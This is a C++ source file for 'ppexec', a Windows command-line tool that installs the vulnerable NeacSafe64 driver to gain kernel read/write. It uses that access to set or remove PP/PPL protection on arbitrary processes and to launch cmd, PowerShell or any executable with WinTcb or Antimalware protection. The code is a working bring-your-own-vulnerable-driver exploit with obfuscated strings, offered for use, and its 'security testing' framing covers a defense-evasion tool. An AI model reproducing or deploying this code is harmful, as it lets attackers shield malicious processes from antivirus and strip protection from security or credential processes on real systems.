// PPL Control tool for Windows 10/11, Windows Server 2025 
// uses vulnerable driver to set PPL/PP protection for processes, also can start protected powershell/cmd shells and execute commands with protection flags
// you can use it to protect any process
// You can also use it to test security products behavior with protected processes, for example, create protected powershell and check if your antivirus can detect malicious activity in it
// You can also unprotect any process
// Vulnerable driver used in this project is NeacSafe64, which is a vulnerable driver for Windows 10/11 x64 that allows arbitrary kernel read/write and other operations, you can find it on GitHub or other sources, but be careful when downloading and using it, because it can be used for malicious purposes too
// Checked on Windows 10 21H2 and Windows 11 22H2, but it should work on other versions too
#define NOMINMAX
#include <windows.h>
#include <cstdio>
#include <newdev.h>
#include <algorithm>
#include <vector>
#include <atomic>

#include "Controller.h"
#include "crypt.h"
#include "dynapi.h"
#include "service.h"
#include "extract.h"
#include "files.h"
#include "pids.h"
#include "cmd.h"


DWORD glob_debug_out = 0;

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "fltlib.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "Newdev.lib")

void SoftExit(HANDLE hPort, int exitCode);

VOID PrintUsage(LPWSTR Prog);
VOID PrintUsage(LPWSTR Prog)
{
    wprintf(SKW(L"ppexec.exe info\n"));
    wprintf(SKW(L"ppexec.exe list\n"));
    wprintf(SKW(L"ppexec.exe get <PID>\n"));
    wprintf(SKW(L"ppexec.exe set <PID> <PP|PPL> <TYPE>\n"));
    wprintf(SKW(L"ppexec.exe protect <PID> <PP|PPL> <TYPE>\n"));
    wprintf(SKW(L"ppexec.exe unprotect <PID>\n"));
    wprintf(SKW(L"Signer TYPEs:\n  Authenticode, CodeGen, Antimalware, Lsa, Windows, WinTcb, WinSystem\n"));
    wprintf(SKW(L"\n"));
    wprintf(SKW(L"ppexec.exe powershell1 <exe> <arg>\t - powershell with PPL+Antimalware protection flags\n"));
    wprintf(SKW(L"ppexec.exe powershell2 <exe> <arg>\t - powershell with PP+WinTcb protection flags\n"));
    wprintf(SKW(L"ppexec.exe cmd1 <exe> <arg>\t - cmd shell with PPL+Antimalware protection flags\n"));
    wprintf(SKW(L"ppexec.exe cmd2 <exe> <arg>\t - cmd shell with PP+WinTcb protection flags\n"));
    wprintf(SKW(L"ppexec.exe exec1 <exe> <arg>\t - execute command with PPL+Antimalware protection flags (DANGER COMMAND)\n"));
    wprintf(SKW(L"ppexec.exe exec2 <exe> <arg>\t - execute command with PP+WinTcb protection flags  (DANGER COMMAND)\n"));
    wprintf(SKW(L"ppexec.exe install\t\t - install driver NeacSafe64\n"));
    wprintf(SKW(L"ppexec.exe uninstall\t\t - uninstall driver NeacSafe64\n"));
    wprintf(SKW(L"ppexec.exe extract\t\t - extract driver NeacSafe64\n"));
    wprintf(SKW(L"ppexec.exe start\t\t - start driver NeacSafe64\n"));
    wprintf(SKW(L"ppexec.exe stop\t\t\t - stop driver NeacSafe64\n"));
}

int wmain(int argc, wchar_t* argv[])
{
    if (!dynapi::Initialize()) {
        wprintf(SKW(L"[!] Wmain::dynapi->Initialize, critical error.\nExit.\n"));
        return 1;
    }

    g_log.InitDefault();

    EnableVirtualTerminal();

    glob_debug_out = 0;


    if (argc < 2)
    {
        PrintUsage(argv[0]);
        return 1;
    }

    std::wstring var1;
    std::wstring var2;

    var1 = argv[1];
    var2 = SKW(L"--help");
    if (var1 == var2) {
        PrintUsage(argv[0]);
        return 1;
    }

    if (!_wcsicmp(argv[1], SKW(L"info")))
    {
        PrintProcessInfo();
        DemonstratePIDUsage();
        parents::PrintParentProcessInfo(GetCurrentProcessId());
        exit(0);
    }

    std::wstring svcName = SKW(L"NeacSafe64");
    std::wstring outName = SKW(L"NeacSafe64.inf");
    WORD RES_ID_TESTDAT = 101;

    if (!_wcsicmp(argv[1], SKW(L"start")))
    {
		DWORD dwStart = DoStartService(svcName);
        if (dwStart == 5) {
			g_log.Printf(LogLevel::Good, SKW(L"[+] Wmain::DoStartService() Service %s started successfully.\n"), svcName.c_str());
        }
        else {
			g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::DoStartService() Service %s start failed.\n"), svcName.c_str());
        }
        exit(0);
    }

    if (!_wcsicmp(argv[1], SKW(L"stop")))
    {
        if(StopService(svcName)) {
            g_log.Printf(LogLevel::Good, SKW(L"[+] Wmain::StopService() Service %s stopped successfully.\n"), svcName.c_str());
        }
        else {
            g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::StopService() Service %s stop failed.\n"), svcName.c_str());
		}
        exit(0);
    }

    if (!_wcsicmp(argv[1], SKW(L"extract")))
    {
        if (extract(RES_ID_TESTDAT, outName, svcName) == 0) {
            g_log.Printf(LogLevel::Good, SKW(L"[+] Wmain::extract() Driver %s extracted successfully.\n"), outName.c_str());
            outName = SKW(L"NeacSafe64.sys");
            RES_ID_TESTDAT = 102;
            if (extract(RES_ID_TESTDAT, outName, svcName) == 0) {
                g_log.Printf(LogLevel::Good, SKW(L"[+] Wmain::extract() Driver %s extracted successfully.\n"), outName.c_str());
            }
            else {
                g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::extract() Driver sys %s extraction failed.\n"), outName.c_str());
                exit(-4);
            }
        }
        else {
            g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::extract() Driver inf %s extraction failed.\n"), outName.c_str());
            exit(-5);
        }
        exit(0);
    }

	// uninstall driver
    if (!_wcsicmp(argv[1], SKW(L"uninstall")))
    {
        std::wstring serviceName = SKW(L"NeacSafe64");
        StopService(serviceName);
        g_log.Printf(LogLevel::Info, SKW(L"[+] Wmain wait 3 sec...\n"), 3);
        Sleep(3000);
        DeleteServiceAndDriver(svcName, true);
        std::wstring CurDir = GetCurrentExeDirectory();
        std::wstring infPath = CurDir + SKW(L"\\NeacSafe64.inf");
        std::wstring sysPath = CurDir + SKW(L"\\NeacSafe64.sys");
        DeleteFileW(infPath.c_str());
        DeleteFileW(sysPath.c_str());
        std::wstring serviceNameDrv = SKW(L"NeacSafe64.sys");
        DeleteDriverFile(serviceNameDrv);
        exit(0);
    }

	// install driver
    if (!_wcsicmp(argv[1], SKW(L"install")))
    {
        if (extract(RES_ID_TESTDAT, outName, svcName) == 0) {
            g_log.Printf(LogLevel::Good, SKW(L"[+] Wmain::extract() Driver %s extracted successfully.\n"), outName.c_str());
            outName = SKW(L"NeacSafe64.sys");
            RES_ID_TESTDAT = 102;
            if (extract(RES_ID_TESTDAT, outName, svcName) == 0) {
                g_log.Printf(LogLevel::Good, SKW(L"[+] Wmain::extract() Driver %s extracted successfully.\n"), outName.c_str());
                // Проверка прав администратора
                if (!IsRunningAsAdmin()) {
                    g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::IsRunningAsAdmin() The program is not running with administrator privileges.\n"));
                    exit(-1);
                }
                else {
                    g_log.Printf(LogLevel::Good, SKW(L"[+] Wmain::IsRunningAsAdmin() The program is running with administrator privileges.\n"));
                }
                // Проверка и копирование драйвера
                std::wstring driverFileName = SKW(L"NeacSafe64.sys");
                if (CheckAndCopyDriverFile(driverFileName)) {
                    g_log.Printf(LogLevel::Good, SKW(L"[+] Wmain::CheckAndCopyDriverFile() Driver file %s is present in system32\\drivers\\\n"), driverFileName.c_str());
                }
                else {
                    g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::CheckAndCopyDriverFile() Failed to copy driver file %s to system32\\drivers\\\n"), driverFileName.c_str());
                    exit(-2);
                }

                // Install driver via viola method
                DWORD outPid;
                if (!RunInstallDriver(&outPid)) {
                    g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::RunInstallDriver() Failed to install driver.\n"));
                    exit(-3);
                }

            }
            else {
                g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::extract() Driver sys %s extraction failed.\n"), outName.c_str());
                exit(-4);
            }
        }
        else {
            g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::extract() Driver inf %s extraction failed.\n"), outName.c_str());
            exit(-5);
        }
        exit(0);
    }


    std::wstring serviceName = SKW(L"NeacSafe64");
    if (!DoesServiceExist(serviceName)) {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::DoesServiceExist() Driver(NeacSafe64) service does not exist.\n"));
        g_log.Printf(LogLevel::Alert, SKW(L"[*] Please, use command: ppexec.exe install\n"));
		exit(-7);
    }

    DWORD dwCheckService = IsServiceRunning(serviceName);
    if (!dwCheckService == ERROR_SUCCESS) {
        if (dwCheckService == ERROR_SERVICE_NOT_ACTIVE) {
            g_log.Printf(LogLevel::Info, SKW(L"[*] Wmain::IsServiceRunning() Driver(NeacSafe64) service is not running. Starting...\n"));
            DoStartService(serviceName);
        }
        else {
            g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::IsServiceRunning() Failed to check service status. Error code: %lu\n"), dwCheckService);
            g_log.Printf(LogLevel::Alert, SKW(L"[*] Try command:\nppexec.exe uninstall\nand\nppexec.exe install\n"));
			exit(-8);
        }
    }else{
		g_log.Printf(LogLevel::Good, SKW(L"[+] Wmain::IsServiceRunning() Driver(NeacSafe64) service is running.\n"));
	}

    // unpack key
    std::string arm1 = SKA("FuckKeenFuckKeenFuckKeenFuckKeen");
    SecureZeroMemory(Key, sizeof(Key));
    size_t len = std::min(arm1.size(), sizeof(Key) - 1);
    memcpy(Key, arm1.data(), len);
    Key[len] = 0;

    OffsetFinder* of;
    RTCore* rtc;
    Controller* ctrl;
    DWORD dwPid;

    of = new OffsetFinder();
    rtc = new RTCore();
    ctrl = new Controller(rtc, of);

    if (!of->FindAllOffsets())
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::of->FindAllOffsets() Failed to determine the required offsets.\n"));
        SoftExit(hPort, 2);
    }

    if (!_wcsicmp(argv[1], SKW(L"powershell1"))) {
        std::wstring pplArg = SKW(L"PPL");
        std::wstring pplType = SKW(L"Antimalware");
        HANDLE hProc = NULL;
        auto r = LaunchInteractiveShellWithPidWatcher(true, L"", &hProc, nullptr);
        if (!r.started) {
            g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::powershell Failed: %lu\n"), r.win32Error);
            SoftExit(hPort, 2);
        }
        
        DWORD dwPidNew = r.pid;
        std::wstring nameProc = L" ";
        GetProcessNameByPid(dwPidNew, nameProc);
        if (!ctrl->SetProcessProtection(dwPidNew, pplArg.c_str(), pplType.c_str())) {
            g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::powershell() Failed to set protection level for process %lu [%ws] [%ws] [%ws]\n"), dwPidNew, nameProc.c_str(), pplArg.c_str(), pplType.c_str());
            return false;
        }
        else {
            g_log.Printf(LogLevel::Good, SKW(L"[+] Wmain::powershell() Successfully set protection level for process %lu [%ws] [%ws] [%ws]\n"), dwPidNew, nameProc.c_str(), pplArg.c_str(), pplType.c_str());
            ctrl->GetProcessProtection(dwPidNew);
        }
        WaitForSingleObject(hProc, INFINITE);
        CloseHandle(hProc);
        SoftExit(hPort, 0);
    }

    if (!_wcsicmp(argv[1], SKW(L"powershell2"))) {
        std::wstring pplArg = SKW(L"PP");
        std::wstring pplType = SKW(L"WinTcb");
        HANDLE hProc = NULL;
        auto r = LaunchInteractiveShellWithPidWatcher(true, L"", &hProc, nullptr);
        if (!r.started) {
            g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::powershell Failed: %lu\n"), r.win32Error);
            SoftExit(hPort, 2);
        }

        DWORD dwPidNew = r.pid;
        std::wstring nameProc = L" ";
        GetProcessNameByPid(dwPidNew, nameProc);
        if (!ctrl->SetProcessProtection(dwPidNew, pplArg.c_str(), pplType.c_str())) {
            g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::powershell() Failed to set protection level for process %lu [%ws] [%ws] [%ws]\n"), dwPidNew, nameProc.c_str(), pplArg.c_str(), pplType.c_str());
            return false;
        }
        else {
            g_log.Printf(LogLevel::Good, SKW(L"[+] Wmain::powershell() Successfully set protection level for process %lu [%ws] [%ws] [%ws]\n"), dwPidNew, nameProc.c_str(), pplArg.c_str(), pplType.c_str());
            ctrl->GetProcessProtection(dwPidNew);
        }
        WaitForSingleObject(hProc, INFINITE);
        CloseHandle(hProc);
        SoftExit(hPort, 0);
    }

    if (!_wcsicmp(argv[1], SKW(L"cmd1"))) {
        std::wstring pplArg = SKW(L"PPL");
        std::wstring pplType = SKW(L"Antimalware");
        HANDLE hProc = NULL;
        auto r = LaunchInteractiveShellWithPidWatcher(false, L"", &hProc, nullptr);
        if (!r.started) {
            g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::powershell Failed: %lu\n"), r.win32Error);
            SoftExit(hPort, 2);
        }

        DWORD dwPidNew = r.pid;
        std::wstring nameProc = L" ";
        GetProcessNameByPid(dwPidNew, nameProc);
        if (!ctrl->SetProcessProtection(dwPidNew, pplArg.c_str(), pplType.c_str())) {
            g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::powershell() Failed to set protection level for process %lu [%ws] [%ws] [%ws]\n"), dwPidNew, nameProc.c_str(), pplArg.c_str(), pplType.c_str());
            return false;
        }
        else {
            g_log.Printf(LogLevel::Good, SKW(L"[+] Wmain::powershell() Successfully set protection level for process %lu [%ws] [%ws] [%ws]\n"), dwPidNew, nameProc.c_str(), pplArg.c_str(), pplType.c_str());
            ctrl->GetProcessProtection(dwPidNew);
        }
        WaitForSingleObject(hProc, INFINITE);
        CloseHandle(hProc);
        SoftExit(hPort, 0);
    }

    if (!_wcsicmp(argv[1], SKW(L"cmd2"))) {
        std::wstring pplArg = SKW(L"PP");
        std::wstring pplType = SKW(L"WinTcb");
        HANDLE hProc = NULL;
        auto r = LaunchInteractiveShellWithPidWatcher(false, L"", &hProc, nullptr);
        if (!r.started) {
            g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::powershell Failed: %lu\n"), r.win32Error);
            SoftExit(hPort, 2);
        }

        DWORD dwPidNew = r.pid;
        std::wstring nameProc = L" ";
        GetProcessNameByPid(dwPidNew, nameProc);
        if (!ctrl->SetProcessProtection(dwPidNew, pplArg.c_str(), pplType.c_str())) {
            g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::powershell() Failed to set protection level for process %lu [%ws] [%ws] [%ws]\n"), dwPidNew, nameProc.c_str(), pplArg.c_str(), pplType.c_str());
            return false;
        }
        else {
            g_log.Printf(LogLevel::Good, SKW(L"[+] Wmain::powershell() Successfully set protection level for process %lu [%ws] [%ws] [%ws]\n"), dwPidNew, nameProc.c_str(), pplArg.c_str(), pplType.c_str());
            ctrl->GetProcessProtection(dwPidNew);
        }
        WaitForSingleObject(hProc, INFINITE);
        CloseHandle(hProc);
        SoftExit(hPort, 0);
    }


    if (!_wcsicmp(argv[1], SKW(L"exec1"))) {
        if (argc < 3) {
            g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::exec1() Not enough arguments.\n"));
            exit(-9);
        }
        std::wstring pplArg = SKW(L"PPL");
        std::wstring pplType = SKW(L"Antimalware");
        std::wstring exePath = argv[2];
        std::wstring command;
        if (argc == 4) {
            std::wstring exeParam = argv[3];
            command = L"\"" + exeParam + L"\"";
        }
        else {
            command = L"";
        }
        auto res = CreateSuspendedWithPipe(exePath, command);
        if (!res.ok) {
            wprintf(L"CreateProcessW failed: %lu\n", res.win32Error);
            exit(0);
        }

		DWORD dwPidNew = res.pi.dwProcessId;
        std::wstring nameProc = L" ";
        GetProcessNameByPid(dwPidNew, nameProc);
        if (!ctrl->SetProcessProtection(dwPidNew, pplArg.c_str(), pplType.c_str())) {
            g_log.Printf(LogLevel::Error, SKW(L"[!] cmd::manipulate() Failed to set protection level for process %lu [%ws] [%ws] [%ws]\n"), dwPidNew, nameProc.c_str(), pplArg.c_str(), pplType.c_str());
            return false;
        }
        else {
            g_log.Printf(LogLevel::Good, SKW(L"[+] cmd::manipulate() Successfully set protection level for process %lu [%ws] [%ws] [%ws]\n"), dwPidNew, nameProc.c_str(), pplArg.c_str(), pplType.c_str());
            ctrl->GetProcessProtection(dwPidNew);
        }

        ResumeThread(res.pi.hThread);


        WaitForSingleObject(res.pi.hProcess, INFINITE);

        std::wstring out = ReadAllPipeTextAndClose(res.hRead);
        wprintf(L"%s\n", out.c_str());

        CloseHandle(res.pi.hThread);
        CloseHandle(res.pi.hProcess);
        exit(0);
    }

    if (!_wcsicmp(argv[1], SKW(L"exec2"))) {
        if (argc < 3) {
            g_log.Printf(LogLevel::Error, SKW(L"[!] Wmain::exec2() Not enough arguments.\n"));
            exit(-9);
        }
        std::wstring pplArg = SKW(L"PP");
        std::wstring pplType = SKW(L"WinTcb");
        std::wstring exePath = argv[2];
        std::wstring command;
        if (argc == 4) {
            std::wstring exeParam = argv[3];
            command = L"\"" + exeParam + L"\"";
        }
        else {
            command = L"";
        }
        auto res = CreateSuspendedWithPipe(exePath, command);
        if (!res.ok) {
            wprintf(L"CreateProcessW failed: %lu\n", res.win32Error);
            exit(0);
        }

        DWORD dwPidNew = res.pi.dwProcessId;
        std::wstring nameProc = L" ";
        GetProcessNameByPid(dwPidNew, nameProc);
        if (!ctrl->SetProcessProtection(dwPidNew, pplArg.c_str(), pplType.c_str())) {
            g_log.Printf(LogLevel::Error, SKW(L"[!] cmd::manipulate() Failed to set protection level for process %lu [%ws] [%ws] [%ws]\n"), dwPidNew, nameProc.c_str(), pplArg.c_str(), pplType.c_str());
            return false;
        }
        else {
            g_log.Printf(LogLevel::Good, SKW(L"[+] cmd::manipulate() Successfully set protection level for process %lu [%ws] [%ws] [%ws]\n"), dwPidNew, nameProc.c_str(), pplArg.c_str(), pplType.c_str());
            ctrl->GetProcessProtection(dwPidNew);
        }

        ResumeThread(res.pi.hThread);


        WaitForSingleObject(res.pi.hProcess, INFINITE);

        std::wstring out = ReadAllPipeTextAndClose(res.hRead);
        wprintf(L"%s\n", out.c_str());

        CloseHandle(res.pi.hThread);
        CloseHandle(res.pi.hProcess);
        exit(0);
    }


    if (!_wcsicmp(argv[1], SKW(L"list")))
    {
        if (!ctrl->ListProtectedProcesses())
            SoftExit(hPort, 2);
    }
    else if (!_wcsicmp(argv[1], SKW(L"get")) || !_wcsicmp(argv[1], SKW(L"unprotect")))
    {
        ++argv;
        --argc;

        if (argc < 2)
        {
            g_log.Printf(LogLevel::Warn, SKW(L"[!] Wmain::_wcsicmp() Missing argument(s) for command: %ws\n"), argv[0]);
            SoftExit(hPort, 2);
        }

        if (!(dwPid = wcstoul(argv[1], nullptr, 10)))
        {
            g_log.Printf(LogLevel::Warn, SKW(L"[!] Wmain::wcstoul() Failed to parse argument as an unsigned integer: %ws\n"), argv[1]);
            SoftExit(hPort, 2);
        }

        if (!_wcsicmp(argv[0], SKW(L"get")))
        {
            if (!ctrl->GetProcessProtection(dwPid))
                SoftExit(hPort, 2);
        }
        else if (!_wcsicmp(argv[0], SKW(L"unprotect")))
        {
            if (!ctrl->UnprotectProcess(dwPid))
                SoftExit(hPort, 2);
        }
        else
        {
            g_log.Printf(LogLevel::Warn, SKW(L"[!] Wmain::_wcsicmp() Unknown command: %ws\n"), argv[0]);
            SoftExit(hPort, 2);
        }
    }
    else if (!_wcsicmp(argv[1], SKW(L"set")) || !_wcsicmp(argv[1], SKW(L"protect")))
    {
        ++argv;
        --argc;

        if (argc < 4)
        {
            g_log.Printf(LogLevel::Warn, SKW(L"[!] Wmain::_wcsicmp() Missing argument(s) for command: %ws\n"), argv[0]);
            SoftExit(hPort, 2);
        }

        if (!(dwPid = wcstoul(argv[1], nullptr, 10)))
        {
            g_log.Printf(LogLevel::Warn, SKW(L"[!] Wmain::wcstoul() Failed to parse argument as an unsigned integer: %ws\n"), argv[1]);
            SoftExit(hPort, 2);
        }

        if (!_wcsicmp(argv[0], SKW(L"set")))
        {
            if (!ctrl->SetProcessProtection(dwPid, argv[2], argv[3]))
                SoftExit(hPort, 2);
        }
        else if (!_wcsicmp(argv[0], SKW(L"protect")))
        {
            if (!ctrl->ProtectProcess(dwPid, argv[2], argv[3]))
                SoftExit(hPort, 2);
        }
        else
        {
            g_log.Printf(LogLevel::Warn, SKW(L"[!] Wmain::_wcsicmp() Unknown command: %ws"), argv[0]);
            SoftExit(hPort, 1);
        }
    }
    else
    {
        g_log.Printf(LogLevel::Warn, SKW(L"[!] Wmain::_wcsicmp() Unknown command: %ws\n"), argv[1]);
        SoftExit(hPort, 1);
    }

    g_log.Printf(LogLevel::Good, SKW(L"Done\n"));


    SoftExit(hPort, 0);
    return 0;
}

void SoftExit(HANDLE hPort, int exitCode) {
    DWORD err = 0;
    SafeCloseHandle(&hPort, &err);
    //std::wstring serviceName = SKW(L"NeacSafe64");
    //StopService(serviceName);
    if (exitCode == 0) {
        g_log.Printf(LogLevel::Good, SKW(L"[+] Exit with error code %d\n"), exitCode);
    }
    else {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Exit with error code %d\n"), exitCode);
    }
    exit(exitCode);
}


